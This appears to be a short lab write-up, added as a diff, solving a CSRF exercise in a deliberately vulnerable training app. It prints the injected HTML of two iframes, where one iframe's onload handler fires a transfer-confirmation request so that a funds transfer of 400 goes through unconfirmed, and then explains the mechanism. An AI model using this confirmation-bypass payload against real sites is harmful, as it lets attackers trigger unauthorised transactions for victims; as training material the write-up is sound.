@@ -1,0 +1,9 @@
+As it is explained in the Hint, this email message field is the one that is explitable and the following code was inserted into the message field:
+
+<iframe id="if1" width="500" height="300">
+</iframe>
+<iframe id="if2" src="attack?Screen=281&menu=900&transferFunds=400" width="500" height="300" onload="document.getElementById('if1').src='attack?Screen=281&menu=900&transferFunds=CONFIRM';">
+</iframe>
+
+
+For this attack, we create two iframes in the body of the email message where the first one has an empty src field and the second one points to the attack URL with a transferFunds of 400 dollars. When the second iframe loads, it populates the src field of the first iframe, triggered using the onload() method of iframe. The first iframe sets transferFunds field of the POST request to CONFIRM to validate the transaction.
